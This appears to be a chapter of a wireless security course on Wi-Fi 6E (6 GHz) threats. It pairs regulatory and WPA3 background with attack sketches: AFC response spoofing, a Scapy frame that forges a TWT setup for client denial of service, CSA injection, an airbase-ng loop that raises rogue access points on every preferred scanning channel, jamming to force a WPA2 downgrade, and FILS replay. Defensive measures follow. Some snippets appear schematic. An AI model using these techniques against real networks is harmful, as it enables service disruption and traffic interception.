# 09 - Wi-Fi 6E (6 GHz) Security Deep Dive

## Overview

Wi-Fi 6E extends 802.11ax into the 6 GHz band (5.925-7.125 GHz). Key security implications: all 6 GHz networks MUST use WPA3 (no WPA2 allowed), new AFC (Automated Frequency Coordination) requirements, and DFS/TPC rules differ significantly from 5 GHz.

## 6 GHz Regulatory Domains

| Domain | UNII-5 (5.925-6.425 GHz) | UNII-6 (6.425-6.525 GHz) | UNII-7 (6.525-6.875 GHz) | UNII-8 (6.875-7.125 GHz) |
|--------|-------------------------|-------------------------|-------------------------|-------------------------|
| FCC (US) | Indoor + Standard Power (with AFC) | Indoor + Standard Power | Indoor + Standard Power | Indoor + Standard Power |
| ETSI (EU) | 20 dBm EIRP (LPI) | 20 dBm EIRP (LPI) | - | - |
| UK | 23 dBm EIRP | 23 dBm EIRP | - | - |
| Japan | 6 GHz partially open | - | - | - |
| China | Not allocated | - | - | - |

## WPA3-Only Mandate

Unlike 2.4/5 GHz where WPA2 transition mode is common, 6 GHz requires:
- **SAE (WPA3-Personal)** or **WPA3-Enterprise**
- **PMF (802.11w) mandatory** — cannot be disabled
- **No TKIP or WEP support**
- **No open networks** (except for initial setup with OWE)

This removes entire attack classes but creates new ones:

## Attack 1: AFC Database Poisoning

Standard Power (SP) APs must query an AFC database to check for incumbent users (satellite, fixed microwave). The AFC response authorizes channel/power use.

```bash
# AFC uses HTTPS REST API between AP and AFC server
# MITM on AFC channel could:
# 1. Spoof AFC "all-clear" response → AP operates on occupied channel
# 2. Spoof AFC "deny" response → AP shuts down or moves channel
# 3. Inject fake incumbent detection → AP reduces power

# AFC API endpoints (varies by provider):
#   Google: https://wifi.spectrumedge.google.com/v1/
#   Federated Wireless: https://api.example.com/afc/v1/
#   Sony: https://afc.example.com/

# Intercept AFC queries:
tcpdump -i eth0 host afc.provider.com -w afc_traffic.pcap

# The AFC request contains:
#   - Device serial number, FCC ID
#   - Geolocation (lat/lon, altitude)
#   - Antenna parameters (height, pattern, gain)
#   - Requested channels/power levels

# AFC response contains:
#   - Available channels with max EIRP per channel
#   - Exclusion zones (no operation)
#   - Incumbent user info (satellite earth station coords)

# Attack: Forge AFC response claiming channel is available at full power
# when it's actually occupied → interference with licensed users
# This is a regulatory violation but demonstrates vulnerability
```

## Attack 2: 6 GHz Target Wake Time (TWT) Abuse

TWT allows AP to schedule client wake times for power saving. Spoofing TWT agreements can cause DoS or traffic interception.

```bash
# TWT is negotiated via Action frames (category 7, action 6-11)
# TWT Setup frame contains:
#   - TWT Control: Request/Command/Group/Demand
#   - Target Wake Time: Absolute time in microseconds
#   - Wake Interval: How often to wake
#   - Minimum Wake Duration: How long to stay awake

# Using Scapy to craft malicious TWT setup
pkt = RadioTap() / Dot11(
    addr1=<CLIENT_MAC>,
    addr2=<AP_MAC>,
    addr3=<AP_MAC>,
    type=0, subtype=0x0D  # Action
) / Dot11Action(category=7) / Dot11TWT(
    control=0x0001,  # TWT Setup
    request_type=0x0001,  # Request TWT
    target_wake_time=0xFFFFFFFF,  # Far future → client never wakes
    wake_interval=0xFFFFFFFF,  # Never wakes again
    min_duration=0  # Zero duration
)
# Client enters permanent sleep mode → DoS
```

## Attack 3: 6 GHz Channel Move Attacks

Because 6 GHz uses channel numbering 1-233 (unlike 2.4/5 GHz's 36-165), channel manipulation attacks differ.

```bash
# 6 GHz channels:
#   20 MHz: 1, 5, 9, 13, ... (step 4)
#   40 MHz: 3, 11, 19, ... (step 8)
#   80 MHz: 7, 23, 39, ... (step 16)
#   160 MHz: 15, 47, 79, ... (step 32)
#   320 MHz (Wi-Fi 7): 31, 63, ... (step 64)

# Channel Switch Announcement (CSA) injection
# Force all clients to move to a congested or unauthorized channel
csa = Dot11CSA(mode=1, channel=233, count=1)  # Move to highest channel
# Channel 233 is near 7.125 GHz — may have incumbent interference
```

## Attack 4: Preferred Scanning Channel List (PSC) Manipulation

6 GHz defines Preferred Scanning Channels (PSC): 5, 21, 37, 53, 69, 85, 101, 117, 133, 149, 165, 181, 197, 213, 229. Clients scan these first. Spoof beacons/probe responses on PSC to lure clients.

```bash
# Send fake beacons on all PSC channels simultaneously
# Client prefers 6 GHz PSC over 5 GHz channels
# Once associated to rogue AP on PSC, downgrade to 2.4 GHz clone

for ch in 5 21 37 53 69 85 101 117 133 149 165 181 197 213 229; do
    airbase-ng -e "TrustedCorp-6GHz" -c $ch -a <AP_MAC> wlan${ch}mon &
done
```

## Attack 5: 6 GHz WPA3 Transition Mode Downgrade

While 6 GHz requires WPA3, a dual-band AP (2.4/5/6 GHz) with the same SSID may use WPA2 on 5 GHz and WPA3 on 6 GHz. Force client to 5 GHz via jamming or CSA.

```bash
# Jam 6 GHz primary link
# Client roams to 5 GHz where WPA2 is available
# Now standard WPA2 attacks apply (KRACK, handshake capture)

# Use SDR or dedicated 6 GHz adapter to jam PSC channels
# 6 GHz adapter: Intel AX210, MediaTek MT7921, Broadcom BCM4389
```

## Attack 6: FILS (Fast Initial Link Setup) Abuse

FILS is more common in 6 GHz for fast roaming. It combines authentication and association in fewer frames, reducing opportunity for defense but also for attack detection.

```bash
# FILS uses:
#   - Shared key from previous association (FILS-SK)
#   - Or EAP re-authentication protocol (ERP)
#   - Or FILS public key (FILS-PK)

# FILS-Auth (Action frame) contains:
#   - FILS Nonce (32 bytes)
#   - FILS Session (8 bytes)
#   - FILS Wrapped Data (encrypted key)

# Replay attack on FILS-SK:
#   If nonce is not properly incremented, replay FILS-Auth → instant association
```

## Defensive Application

- **AFC integrity**: Sign AFC responses with provider certificate, verify on AP
- **TWT validation**: Limit TWT wake interval to reasonable bounds (ms, not infinite)
- **PSC monitoring**: Alert on unexpected beacons/probe responses on PSC
- **Band steering security**: Verify WPA3 is used on all bands for dual-band SSIDs
- **FILS nonce tracking**: Enforce strict nonce increment, reject replays
- **6 GHz geofencing**: Use GPS/location to verify 6 GHz operation in authorized areas

## References

- FCC 6 GHz Report and Order (FCC 20-51)
- ETSI EN 303 687 (6 GHz LPI/VLP)
- IEEE 802.11ax-2021 Clause 26.17.2.3 (6 GHz operation)
- Wi-Fi Alliance 6E Technical Specification
- AFC System Specification v1.4
